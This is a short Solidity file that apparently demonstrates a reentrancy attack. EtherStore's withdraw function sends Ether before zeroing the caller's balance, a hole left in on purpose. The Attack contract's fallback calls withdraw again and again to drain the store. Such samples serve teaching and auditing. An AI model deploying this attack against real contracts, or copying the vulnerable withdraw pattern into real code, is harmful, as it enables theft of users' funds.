// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherStore {
    mapping(address => uint256) public balances;

    constructor() {}

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "balances is insufficient.");
        (bool ret,) = msg.sender.call{value: bal}("");
        require(ret, "withdraw failed.");
        balances[msg.sender] = 0;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address etherStoreAddress) {
        etherStore = EtherStore(etherStoreAddress);
    }

    function attack() external payable {
        etherStore.deposit{value: msg.value}();
        etherStore.withdraw();
    }

    fallback() external payable {
        uint256 esBalance = address(etherStore).balance;
        if (esBalance >= msg.value) {
            etherStore.withdraw();
        }
    }
}
